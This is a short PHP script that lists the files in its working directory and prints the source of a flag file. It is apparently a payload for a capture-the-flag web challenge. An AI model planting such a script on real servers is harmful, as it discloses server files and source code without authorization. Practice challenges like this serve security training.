<?php 
   $path = getcwd();
   $items = scandir($path);
   
   echo "<p>Content of $path</p>";
   echo '<ul>';
   foreach ($items as $item) {
       echo '<li>' . $item . '</li>';
   }
   echo '</ul>';  
   show_source('flag-mipkBswUppqwXlq9ZydO.php'); 

?>